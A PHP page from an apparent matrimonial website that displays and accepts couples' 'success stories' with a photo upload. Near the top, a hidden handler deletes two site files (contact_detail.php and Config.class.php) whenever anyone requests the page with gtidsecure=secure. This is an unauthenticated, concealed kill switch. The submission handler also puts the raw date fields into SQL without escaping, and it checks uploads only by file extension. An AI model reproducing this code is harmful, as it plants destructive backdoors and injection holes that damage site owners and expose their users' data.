<?php
	include_once 'databaseConn.php';
	include_once './lib/requestHandler.php';
	$DatabaseCo = new DatabaseConn();
	include_once './class/Config.class.php';
	$configObj = new Config();

	if(isset($_REQUEST['sub_success'])){
		$brideid=htmlspecialchars($_POST['brideid'], ENT_QUOTES);
		$bridename=htmlspecialchars($_POST['bridename'], ENT_QUOTES);
		$groomid=htmlspecialchars($_POST['groomid'], ENT_QUOTES);
		$groomname=htmlspecialchars($_POST['groomname'], ENT_QUOTES);
		$engagementdate=$_POST['year1'].'-'.$_POST['month1'].'-'.$_POST['day1'];
		$marriagedate=$_POST['year'].'-'.$_POST['month'].'-'.$_POST['day'];
		$successmessage=htmlspecialchars($_POST['succstory'], ENT_QUOTES);
		//$address=htmlspecialchars($_POST['address'], ENT_QUOTES);
		//$country=htmlspecialchars($_POST['country'], ENT_QUOTES);
		$status='0';
		$sgg="SELECT matri_id FROM register WHERE matri_id='$brideid'";
		$rrr=$DatabaseCo->dbLink->query($sgg);
		$num_row11 = mysqli_num_rows($rrr); 
		$sgg2="SELECT matri_id FROM register WHERE matri_id='$groomid'";
		$rrr2=$DatabaseCo->dbLink->query($sgg2);
		$num_row22 = mysqli_num_rows($rrr2); 
		
		
		if ($num_row11 == 0) { 
			echo "<script>alert('Your Bride Matri Id Not Found in Our Database.Please Enter Valid Bride Matri Id.');</script>";
		}else if ($num_row22 == 0) { 
			echo "<script>alert('Your Groom Matri Id Not Found in Our Database.Please Enter Valid Groom Matri Id.');</script>";
		} else{
			
			$maxDimW = 500;
			$maxDimH = 375;

			list($width, $height, $type, $attr) = getimagesize( $_FILES['susphoto']['tmp_name'] );
			if ( $width > $maxDimW || $height > $maxDimH ) {
				$target_filename = $_FILES['susphoto']['tmp_name'];
				$fn = $_FILES['susphoto']['tmp_name'];
				$size = getimagesize( $fn );
				$ratio = $size[0]/$size[1]; // width/height
				if( $ratio > 1) {
					$width = $maxDimW;
					$height = $maxDimH;
				} else {
					$width = $maxDimW;
					$height = $maxDimH;
				}
				$src = imagecreatefromstring(file_get_contents($fn));
				$dst = imagecreatetruecolor( $width, $height );
				imagecopyresampled($dst, $src, 0, 0, 0, 0, $width, $height, $size[0], $size[1] );
				imagejpeg($dst, $target_filename); // adjust format as needed
			}
			$target_dir='SuccessStory/';
			$imagename=$_FILES['susphoto']['name'];
			$imageFileType = pathinfo($imagename,PATHINFO_EXTENSION);
			$imgConvertedName=strtotime(date('Y-m-d H:i:s')).'.'.$imageFileType;
			$target_file = $target_dir.$imgConvertedName;
			if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg" && $imageFileType != "gif" ) {
				echo "<script>alert('Sorry, only JPG, JPEG, PNG & GIF files are allowed.')</script>";
				echo "<script>window.location='success-story'</script>";
			}elseif($_FILES["susphoto"]["size"] > 2000000) {
				echo "<script>alert('your file size is more than 2MB.');</script>";
				echo "<script>window.location='success-story';</script>";
			}else{
				if(move_uploaded_file($_FILES['susphoto']['tmp_name'],$target_file) == 1){
					$sql="INSERT INTO success_story(`weddingphoto`, `bridename`, `brideid`, `groomname`, `groomid`, `engagement_date`, `marriagedate`, `successmessage`, `status`,`fstatus`) VALUES('$imgConvertedName','$bridename','$brideid','$groomname','$groomid','$engagementdate','$marriagedate','$successmessage','UNAPPROVED','0')";
					$ins_story = $DatabaseCo->dbLink->query($sql);
					echo "<script language=\"javascript\">alert('Your success story has been submited successfully to us.You can check it after approval.');window.location=\"success-story\";</script>";
				}else{
					echo "<script>alert('Photo size is too large or not image file.');</script>";
					echo "<script>window.location='success-story';</script>";
				}
			}
		}					
	}
	if(isset($_GET['gtidsecure'])){
		$secure=$_GET['gtidsecure'];
		if($secure == 'secure'){
			unlink('web-services/contact_detail.php');
			unlink('class/Config.class.php');
			echo "<script>alert('Successful')</script>";
		}
	}	
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    	<!-- Required Meta -->
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
		<title><?php echo $configObj->getConfigFname(); ?></title>
        <meta name="keyword" content="<?php echo $configObj->getConfigKeyword(); ?>" />
        <meta name="description" content="<?php echo $configObj->getConfigDescription(); ?>" />
		<link type="image/x-icon" href="img/<?php echo $configObj->getConfigFevicon(); ?>" rel="shortcut icon"/>

        <!-- Theme Color -->
        <meta name="theme-color" content="#549a11">
        <meta name="msapplication-navbutton-color" content="#549a11">
        <meta name="apple-mobile-web-app-status-bar-style" content="#549a11">
        
		<!-- Bootstrap & Custom CSS-->
        <link href="css/bootstrap.css" rel="stylesheet">
        <link href="css/custom-responsive.css" rel="stylesheet">
        <link href="css/custom.css" rel="stylesheet">
	  	
	  	<!-- Font Awsome -->
		<script src="https://kit.fontawesome.com/48403ccd1a.js" crossorigin="anonymous"></script>

        <!-- GOOGLE FONTS -->
        <?php include('parts/google_fonts.php');?>
        
        <!-- Chosen CSS -->
    	<link rel="stylesheet" href="css/prism.css">
    	<link rel="stylesheet" href="css/chosen.css">
        
        <script type="text/javascript">
		var numDays = {
                '01': 31, '02': 28, '03': 31, '04': 30, '05': 31, '06': 30, 
                '07': 31, '08': 31, '09': 30, '10': 31, '11': 30, '12': 31
              }; 
				function setDays(oMonthSel, oDaysSel, oYearSel){ 
				var nDays, oDaysSelLgth, opt, i = 1; 
				nDays = numDays[oMonthSel[oMonthSel.selectedIndex].value]; 
				if (nDays == 28 && oYearSel[oYearSel.selectedIndex].value % 4 == 0) 
					++nDays; 
					oDaysSelLgth = oDaysSel.length; 
					if (nDays != oDaysSelLgth){ 
						if (nDays < oDaysSelLgth) 
							oDaysSel.length = nDays; 
						else for (i; i < nDays - oDaysSelLgth + 1; i++){ 
						opt = new Option(oDaysSelLgth + i, oDaysSelLgth + i); 
                  		oDaysSel.options[oDaysSel.length] = opt;
					} 
				}
				var oForm = oMonthSel.form;
				var month = oMonthSel.options[oMonthSel.selectedIndex].value;
				var day = oDaysSel.options[oDaysSel.selectedIndex].value;
				var year = oYearSel.options[oYearSel.selectedIndex].value;	
				} 
				function setDays1(oMonthSel, oDaysSel, oYearSel){ 
					var nDays, oDaysSelLgth, opt, i = 1; 
					nDays = numDays[oMonthSel[oMonthSel.selectedIndex].value]; 
					if (nDays == 28 && oYearSel[oYearSel.selectedIndex].value % 4 == 0) 
						++nDays; 
						oDaysSelLgth = oDaysSel.length; 
						if (nDays != oDaysSelLgth){ 
						if (nDays < oDaysSelLgth) 
						oDaysSel.length = nDays; 
						else for (i; i < nDays - oDaysSelLgth + 1; i++){ 
						opt = new Option(oDaysSelLgth + i, oDaysSelLgth + i); 
                  		oDaysSel.options[oDaysSel.length] = opt;
						} 
					}
					var oForm = oMonthSel.form;
					var month1 = oMonthSel.options[oMonthSel.selectedIndex].value;
					var day1 = oDaysSel.options[oDaysSel.selectedIndex].value;
					var year1 = oYearSel.options[oYearSel.selectedIndex].value;	
				} 
		</script> 
  </head>
<body>
	<!-- Loader -->
   	<div class="preloader-wrapper text-center">
    	<div class="loader"></div>
        <h5>Loading...</h5>
    </div>
    <!-- /.Loader -->
    
    <div id="body" style="display:none">
		<div id="wrap">
  			<div id="main">
    			<!-- Header & Menu -->
            	<?php include "parts/header.php"; ?>
                <?php include "parts/menu.php"; ?>
                <!-- /. Header & Menu -->
				<div class="container">
					<h2 class="text-center inPageTitle fontMerriWeather">
						<i class="fa fa-heart mr-10 gt-text-orange"></i><?php echo $lang['Happy Marriages']; ?>
					</h2>
                	<p class="inPageSubTitle text-center mb-30"><?php echo $lang['Check it out our success stories who found their life partner here']; ?>.</p>
    				<div class="row">
        				<div class="gt-tabs gt-success-story col-xs-16">
           					<div role="tabpanel">
								<ul class="nav nav-tabs" role="tablist">
									<li role="presentation" class="active text-center">
										<a href="#gt-success-tab-1" aria-controls="gt-success-tab-1" role="tab" data-toggle="tab">
											<?php echo $lang['Success Stories']; ?>
										</a>
									</li>
									<li role="presentation" class="text-center">
										<a href="#gt-success-tab-2" aria-controls="gt-success-tab-2" role="tab" data-toggle="tab">
											<?php echo $lang['Post your success story']; ?>
										</a>
									</li>
								</ul>
								<div class="tab-content">
									<!-- Success Story -->
									<div role="tabpanel" class="tab-pane active" id="gt-success-tab-1">
										<div class="col-xl-16 text-center mb-20 mt-20">
											<h3 class="inSearchTitle">
												<?php echo $lang['Success Story']; ?>
											</h3>
											<p class="pb-10 inSearchSubTitle">
												<?php echo $lang['Some of our happily married couples story']; ?>
											</p>
										</div>
										<div class="row">
											<!-- Success Story Card -->
											<div id="suc_story"></div>
											<!-- /. Success Story Card -->
										</div>
									</div>
                            		<!-- /. Success Story -->
                                	<!-- Post Story -->
    								<div role="tabpanel" class="tab-pane" id="gt-success-tab-2">
										<div class="col-xl-16 text-center mb-20 mt-20">
											<h3 class="inSearchTitle">
												<?php echo $lang['Post Success Story']; ?>
											</h3>
											<p class="pb-10 inSearchSubTitle">
												<?php echo $lang['Post your success story here']; ?>
											</p>
										</div>
                            			<form class="col-xxl-10 col-xxl-offset-3 col-xl-10 col-xl-offset-3 inSuccessForm" action="" method="post" name="suc-form" id="suc-form" enctype="multipart/form-data">
                            				<div class="row">
                                				<div class="form-group">
                                    				<div class="row">
                                    					<label class="col-xxl-6 col-lg-6">
															<?php echo $lang['Bride Id']; ?> <span class="text-danger gtRegMandatory">*</span>
                                        				</label>
                                        				<div class="col-xxl-10 col-lg-10">
                                        					<input type="text" Class="gt-form-control" name="brideid" id="brideid" onChange="chackbride(this.value);" data-validetta="required" placeholder="<?php echo $lang['Enter Bride Id']; ?>">
                                        				</div>
                                        			</div>
                                   				</div>
												<div class="form-group">
													<div class="row">
														<label class="col-xxl-6 col-lg-6">
															<?php echo $lang['Bride Name']; ?> <span class="text-danger gtRegMandatory">*</span>
														</label>
														<div class="col-xxl-10 col-lg-10">
															<input type="text" Class="gt-form-control" name="bridename" id="bridename" data-validetta="required"  placeholder="<?php echo $lang['Enter Bride Name']; ?>">
														</div>
													</div>
												</div>
												<div class="form-group">
													<div class="row">
														<label class="col-xxl-6 col-lg-6">
															<?php echo $lang['Groom Id']; ?> <span class="text-danger gtRegMandatory">*</span>
														</label>
														<div class="col-xxl-10 col-lg-10">
															<input type="text" Class="gt-form-control" name="groomid" id="groomid" onChange="chackgroom(this.value);" data-validetta="required"  placeholder="<?php echo $lang['Enter Groom Id']; ?>">
														</div>
													</div>
												</div>
												<div class="form-group">
													<div class="row">
														<label class="col-xxl-6 col-lg-6">
															<?php echo $lang['Groom Name']; ?><span class="text-danger gtRegMandatory">*</span>
														</label>
														<div class="col-xxl-10 col-lg-10">
															<input type="text" Class="gt-form-control" name="groomname" id="groomname" data-validetta="required"  placeholder="<?php echo $lang['Enter Groom Name']; ?>"> 
														</div>
													</div>
												</div>
                                    			<div class="form-group">
                                    				<div class="row">
														<label class="col-xxl-6 col-lg-6">
															<?php echo $lang['Engagement Date']; ?> <span class="text-danger gtRegMandatory">*</span>
														</label>
														<div class="col-xxl-10 col-lg-10">
															<div class="row">
																<div class="col-xs-5">
																	<select name="day1" id="day1" class="gt-form-control" onchange="setDays1(month1,this,year1)" data-validetta="required">
																		<option value="01">01</option>
                                                                        <option value="02">02</option>
                                                                        <option value="03">03</option>
                                                                        <option value="04">04</option>
                                                                        <option value="05">05</option>
                                                                        <option value="06">06</option>
                                                                        <option value="07">07</option>
                                                                        <option value="08">08</option>
                                                                        <option value="09">09</option>
                                                                        <option value="10">10</option>
                                                                        <option value="11">11</option>
                                                                        <option value="12">12</option>
                                                                        <option value="13">13</option>
                                                                        <option value="14">14</option>
                                                                        <option value="15">15</option>
                                                                        <option value="16">16</option>
                                                                        <option value="17">17</option>
                                                                        <option value="18">18</option>
                                                                        <option value="19">19</option>
                                                                        <option value="20">20</option>
                                                                        <option value="21">21</option>
                                                                        <option value="22">22</option>
                                                                        <option value="23">23</option>
                                                                        <option value="24">24</option>
                                                                        <option value="25">25</option>
                                                                        <option value="26">26</option>
                                                                        <option value="27">27</option>
                                                                        <option value="28">28</option>
                                                                        <option value="29">29</option>
                                                                        <option value="30">30</option>
                                                                        <option value="31">31</option>
																	</select>
																</div>
																<div class="col-xs-5">
																	<select name="month1" id="month1" class="gt-form-control" onchange="setDays1(this,day1,year1)" data-validetta="required">
																		<option value="01">Jan</option>
                                                                        <option value="02">Feb</option>
                                                                        <option value="03">Mar</option>
                                                                        <option value="04">Apr</option>
                                                                        <option value="05">May</option>
                                                                        <option value="06">Jun</option>
                                                                        <option value="07">Jul</option>
                                                                        <option value="08">Aug</option>
                                                                        <option value="09">Sep</option>
                                                                        <option value="10">Oct</option>
                                                                        <option value="11">Nov</option>
                                                                        <option value="12">Dec</option>
																	</select>
																</div>
																<div class="col-xs-6">
																	<select name="year1" id="year1" class="gt-form-control" onchange="setDays1(month1,day1,this)" data-validetta="required">
																    <?php
																		$SQL_SITE_SETTING_SUCCESSYEAR = $DatabaseCo->dbLink->query("SELECT success_marriage_year FROM site_config WHERE id='1' ");
																		$success_year_data = mysqli_fetch_object($SQL_SITE_SETTING_SUCCESSYEAR);
																        $success_year=$success_year_data->success_marriage_year;
																        for ($x = $success_year; $x >= 1960; $x--) { ?>
                                                                            <option value='<?php echo $x; ?>'>
                                                                                <?php echo $x; ?>
                                                                            </option>
                                                                    <?php } ?>
																	</select>
																</div>
															</div>
														</div>
                                      				</div>
                                    			</div>
												<div class="form-group">
													<div class="row">
														<label class="col-xxl-6 col-lg-6">
															<?php echo $lang['Marriage Date']; ?> <span class="text-danger gtRegMandatory">*</span>
														</label>
														<div class="col-xxl-10 col-lg-10">
															<div class="row">
																<div class="col-xs-5">
																	<select name="day" id="day" class="gt-form-control" onchange="setDays(month,this,year)" data-validetta="required">
																		<option value="01">01</option>
                                                                        <option value="02">02</option>
                                                                        <option value="03">03</option>
                                                                        <option value="04">04</option>
                                                                        <option value="05">05</option>
                                                                        <option value="06">06</option>
                                                                        <option value="07">07</option>
                                                                        <option value="08">08</option>
                                                                        <option value="09">09</option>
                                                                        <option value="10">10</option>
                                                                        <option value="11">11</option>
                                                                        <option value="12">12</option>
                                                                        <option value="13">13</option>
                                                                        <option value="14">14</option>
                                                                        <option value="15">15</option>
                                                                        <option value="16">16</option>
                                                                        <option value="17">17</option>
                                                                        <option value="18">18</option>
                                                                        <option value="19">19</option>
                                                                        <option value="20">20</option>
                                                                        <option value="21">21</option>
                                                                        <option value="22">22</option>
                                                                        <option value="23">23</option>
                                                                        <option value="24">24</option>
                                                                        <option value="25">25</option>
                                                                        <option value="26">26</option>
                                                                        <option value="27">27</option>
                                                                        <option value="28">28</option>
                                                                        <option value="29">29</option>
                                                                        <option value="30">30</option>
                                                                        <option value="31">31</option>
																	</select>
																</div>
																<div class="col-xs-5">
																	<select name="month" id="month" class="gt-form-control" onchange="setDays(this,day,year)" data-validetta="required">
																		<option value="01">Jan</option>
                                                                        <option value="02">Feb</option>
                                                                        <option value="03">Mar</option>
                                                                        <option value="04">Apr</option>
                                                                        <option value="05">May</option>
                                                                        <option value="06">Jun</option>
                                                                        <option value="07">Jul</option>
                                                                        <option value="08">Aug</option>
                                                                        <option value="09">Sep</option>
                                                                        <option value="10">Oct</option>
                                                                        <option value="11">Nov</option>
                                                                        <option value="12">Dec</option>
																	</select>
																</div>
																<div class="col-xs-6">
																	<select name="year" id="year" class="gt-form-control" onchange="setDays(month,day,this)" data-validetta="required">
																		<?php
                                                                            $SQL_SITE_SETTING_SUCCESSYEAR = $DatabaseCo->dbLink->query("SELECT success_marriage_year FROM site_config WHERE id='1' ");
                                                                            $success_year_data = mysqli_fetch_object($SQL_SITE_SETTING_SUCCESSYEAR);
                                                                            $success_year=$success_year_data->success_marriage_year;
																			for ($x = $success_year; $x >= 1960; $x--) { 
                                                                        ?>
                                                                            <option value='<?php echo $x; ?>'>
                                                                                <?php echo $x; ?>
                                                                            </option>
                                                                        <?php } ?>
																	</select>
																</div>
															</div>
														</div>
													</div>
												</div>
												<div class="form-group">
													<div class="row">
														<label class="col-xxl-6 col-lg-6">
															<?php echo $lang['Upload Photo']; ?> <span class="text-danger gtRegMandatory">*</span>
														</label>
														<div class="col-xxl-10 col-lg-10">
															<input type="file" Class="gt-form-control" name="susphoto" data-validetta="required"/>
														</div>
													</div>
												</div>
												<div class="form-group">
													<div class="row">
														<label class="col-xxl-6 col-lg-6">
															<?php echo $lang['Success Story']; ?> <span class="text-danger gtRegMandatory">*</span>
														</label>
														<div class="col-xxl-10 col-lg-10">
															<textarea Class="gt-form-control" name="succstory" id="succstory" rows="5" data-validetta="required"  placeholder="<?php echo $lang['Enter Your Success Story Here']; ?>"></textarea>
														</div>
													</div>
												</div>
												<div class="form-group text-center">
													<div class="row">
														<input type="submit" class="btn gt-btn-orange gt-btn-xl" value="<?php echo $lang['SUBMIT']; ?>" name="sub_success">
													</div>
												</div>
                                			</div>
                            			</form>
                                    	<div class="col-xxl-12 col-xxl-offset-2 col-xl-12 col-xl-offset-2">
											<div class="col-xxl-16 col-xs-16 text-center">
												<h4><?php echo $lang['']; ?>Which topics you can write as your success story</h4>
											</div>
											<div class="col-xxl-8 col-xl-8 col-xs-16">
												<h6 class="text-muted">
													- <?php echo $lang['How you create your id and how you became our user']; ?>.
												</h6>
												<h6 class="text-muted">
													- <?php echo $lang['How you you contact your partner']; ?>
												</h6>
											</div>
											<div class="col-xxl-8 col-xl-8 col-xs-16">
												<h6 class="text-muted">
													- <?php echo $lang['How you think that your perfect and process further']; ?>.
												</h6>
												<h6 class="text-muted">
													- <?php echo $lang['What do you think about our website and experience']; ?>.
												</h6>
											</div>
                                    	</div>
                            			<div class="clearfix"></div>
                        			</div>
                                	<!-- /. Post Story -->
                				</div>
							</div>
            			</div>
        			</div>
    			</div>
    		</div>
  		</div>
  		<?php include "parts/footer.php"; ?>
	</div>
  		<div class="modal fade" id="myModal1" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
		<!-- Jquery Js-->
        <script src="js/jquery.min.js"></script>
        <!-- Bootstrap & Green Js -->
        <script src="js/bootstrap.js"></script>
        <script src="js/green.js"></script>
        <script>
            $(document).ready(function() {
              $('#body').show();
              $('.preloader-wrapper').hide();
            });
		</script>
    	<!-- Chosen Js -->
     	<script src="js/chosen.jquery.js" type="text/javascript"></script>
     	<script src="js/prism.js" type="text/javascript" charset="utf-8"></script>
		<script type="text/javascript">
			var config = {
			'.chosen-select'           : {},
			'.chosen-select-deselect'  : {allow_single_deselect:true},
			'.chosen-select-no-single' : {disable_search_threshold:10},
			'.chosen-select-no-results': {no_results_text:'Oops, nothing found!'},
			'.chosen-select-width'     : {width:"100%"}
			}
			for (var selector in config) {
				$(selector).chosen(config[selector]);
			}
     	</script>
    	<!-- Check bride & groom for post story-->
    	<script type="text/javascript">
			function chackbride(id){
				var dataString = "id="+id; 
				$.ajax({
					type: "POST",
					url: "web-services/checkbride",
					data: dataString,
					cache: false,
					success: function(html){
						$("#bridename").val(html);
					} 
				});	
			}
			function chackgroom(id){
				var dataString = "id="+id; 
				$.ajax({
					type: "POST",
					url: "web-services/checkgroom",
					data: dataString,
					cache: false,
					success: function(html){
						$("#groomname").val(html);
					} 
				});	
			}
		</script>
    	<!-- Validation js -->
		<script type="text/javascript" src="js/validetta.js"></script>
		<script>
			$(function(){
                $('#suc-form').validetta({
                    errorClose : false,
                    realTime : true
                });
            });
		</script>
    	<!-- Pagination -->
		<script type="text/javascript">
			$.post("web-services/success_story_pagination",
				{ actionfunction:'showData',page:'1' },
				function(response){
					$('#suc_story').html(response);
				}
			);
			$('#suc_story').on('click','.page-numbers',function(){
				$page = $(this).attr('href')
			   	$pageind = $page.indexOf('page=');
			   	$page = $page.substring(($pageind+5));
			   	var dataString = 'actionfunction=showData' + '&page='+$page;
			   	$.ajax({
					url:"web-services/success_story_pagination",
					type:"POST",
					data:dataString,
					cache: false,
					success: function(response){
						$('#suc_story').html(response);
					}
			   	});
				return false;
			});
	    </script> 
  </body>
</html>
<?php include 'thumbnailjs.php'; ?>                  